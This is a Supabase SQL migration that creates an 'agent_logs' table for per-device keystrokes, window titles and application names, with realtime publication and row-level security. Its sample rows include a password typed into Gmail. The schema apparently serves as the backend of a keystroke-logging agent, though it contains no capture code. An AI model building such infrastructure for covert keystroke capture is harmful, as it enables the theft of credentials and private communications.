-- Create agent_logs table if it doesn't exist
CREATE TABLE IF NOT EXISTS public.agent_logs (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE,
    device_id TEXT NOT NULL,
    keystroke TEXT NOT NULL,
    window_title TEXT,
    application TEXT,
    metadata JSONB DEFAULT '{}',
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Enable RLS
ALTER TABLE public.agent_logs ENABLE ROW LEVEL SECURITY;

-- Create policy for users to see only their own logs
CREATE POLICY "Users can view own logs" ON public.agent_logs
    FOR SELECT USING (auth.uid() = user_id);

-- Create policy for inserting logs
CREATE POLICY "Users can insert own logs" ON public.agent_logs
    FOR INSERT WITH CHECK (auth.uid() = user_id);

-- Enable realtime
ALTER PUBLICATION supabase_realtime ADD TABLE public.agent_logs;

-- Create indexes for better performance
CREATE INDEX IF NOT EXISTS idx_agent_logs_user_id ON public.agent_logs(user_id);
CREATE INDEX IF NOT EXISTS idx_agent_logs_created_at ON public.agent_logs(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_agent_logs_device_id ON public.agent_logs(device_id);

-- Insert some sample data for testing (optional)
INSERT INTO public.agent_logs (user_id, device_id, keystroke, window_title, application, created_at)
SELECT 
    auth.uid(),
    'SAMPLE-PC-' || (random() * 100)::int,
    CASE (random() * 5)::int
        WHEN 0 THEN 'Hello World'
        WHEN 1 THEN 'password123'
        WHEN 2 THEN 'npm install'
        WHEN 3 THEN 'SELECT * FROM users'
        ELSE '[Ctrl+C]'
    END,
    CASE (random() * 3)::int
        WHEN 0 THEN 'Notepad - Untitled'
        WHEN 1 THEN 'Chrome - Gmail'
        ELSE 'Terminal - Command Prompt'
    END,
    CASE (random() * 3)::int
        WHEN 0 THEN 'Notepad'
        WHEN 1 THEN 'Chrome'
        ELSE 'Terminal'
    END,
    NOW() - (random() * interval '1 hour')
FROM generate_series(1, 5)
WHERE auth.uid() IS NOT NULL;
